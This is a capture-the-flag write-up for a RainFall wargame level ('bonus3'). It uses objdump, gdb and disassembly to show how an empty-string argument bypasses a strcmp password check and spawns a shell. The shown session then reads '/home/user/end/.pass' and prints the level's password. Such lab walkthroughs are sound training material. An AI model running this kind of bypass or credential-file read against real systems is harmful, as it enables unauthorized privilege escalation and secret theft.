@@ -1,0 +1,61 @@
+We start with the usual call to the program, this time it seems to take 1 and only 1 arg, and just print a newline.. not much here
+$bonus3@RainFall:~$ ./bonus3 a
+$
+
+bonus3@RainFall:~$ objdump -R bonus3 
+
+bonus3:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE 
+080498f4 R_386_GLOB_DAT    __gmon_start__
+08049904 R_386_JUMP_SLOT   strcmp
+08049908 R_386_JUMP_SLOT   fclose
+0804990c R_386_JUMP_SLOT   fread --> interesting
+08049910 R_386_JUMP_SLOT   puts --> the print we see
+08049914 R_386_JUMP_SLOT   __gmon_start__
+08049918 R_386_JUMP_SLOT   __libc_start_main
+0804991c R_386_JUMP_SLOT   fopen --> goes with the read i guess
+08049920 R_386_JUMP_SLOT   execl  --> Our goal probably
+08049924 R_386_JUMP_SLOT   atoi   --> We can maybie find a way to use it
+
+On this one, gdb and ltrace usage will be limited by the call of fopen early in the program, because gdb (and ltrace) are using user permission so fopen fail
+
+Breakpoint 1, 0x08048513 in main ()  --> the  fopen
+(gdb) x /s $eax
+0x80486f2:	 "/home/user/end/.pass" --> We can see that it open and stores the pass to the last level
+
+
+ 804856f:	e8 5c fe ff ff       	call   80483d0 <fread@plt>
+ 8048574:	c6 44 24 59 00       	movb   $0x0,0x59(%esp)
+ 8048579:	8b 45 0c             	mov    0xc(%ebp),%eax
+ 804857c:	83 c0 04             	add    $0x4,%eax
+ 804857f:	8b 00                	mov    (%eax),%eax
+ 8048581:	89 04 24             	mov    %eax,(%esp)
+ 8048584:	e8 a7 fe ff ff       	call   8048430 <atoi@plt>
+ 8048589:	c6 44 04 18 00       	movb   $0x0,0x18(%esp,%eax,1)
+ ...
+ 80485da:	e8 d1 fd ff ff       	call   80483b0 <strcmp@plt>
+ 80485df:	85 c0                	test   %eax,%eax
+ 80485e1:	75 1e                	jne    8048601 <main+0x10d>
+ 80485e3:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
+ 80485ea:	00 
+ 80485eb:	c7 44 24 04 07 87 04 	movl   $0x8048707,0x4(%esp)
+ 80485f2:	08 
+ 80485f3:	c7 04 24 0a 87 04 08 	movl   $0x804870a,(%esp)
+ 80485fa:	e8 21 fe ff ff       	call   8048420 <execl@plt>
+
+
+It seems that the program will take our input, give it to atoi and use the INT produced as an index to add a "\0" to the buffer where is stored the password
+Then it compare the buffer with our input, if true it open a shell !
+
+This is an easy trick : if we pass an empty string "", atoi will return 0 si the first char of our buffer is "\0", cmp stop at any "\0" !
+So it will stop directly and cmp "" with our input with is also "" and we will get our shell ! 
+
+bonus3@RainFall:~$ ./bonus3 ""
+$ whoami
+end
+$ cat /home/user/end/.pass
+3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
+
+WE DID IT, IT'S OVER BRRRRRRRRRR
